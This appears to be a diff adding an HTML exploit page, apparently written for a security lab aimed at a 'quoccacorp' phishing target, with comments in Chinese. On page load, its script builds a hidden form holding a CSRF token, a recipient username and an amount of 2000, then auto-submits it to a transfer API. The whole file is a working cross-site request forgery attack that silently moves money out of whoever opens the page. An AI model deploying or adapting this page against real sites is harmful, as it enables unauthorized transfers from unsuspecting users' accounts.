@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Transferring...</title>
+</head>
+<body>
+    <script>
+        // 动态创建一个表单并提交
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://phish-me.quoccacorp.com/api/transfer';
+
+        const fields = {
+            'csrf_token': 'Mzc1Nw==', // 确保这是你页面上看到的那个值
+            'username': 'z5608795',
+            'amount': '2000'
+        };
+
+        for (const key in fields) {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = key;
+            input.value = fields[key];
+            form.appendChild(input);
+        }
+
+        document.body.appendChild(form);
+        form.submit();
+    </script>
+</body>
+</html>
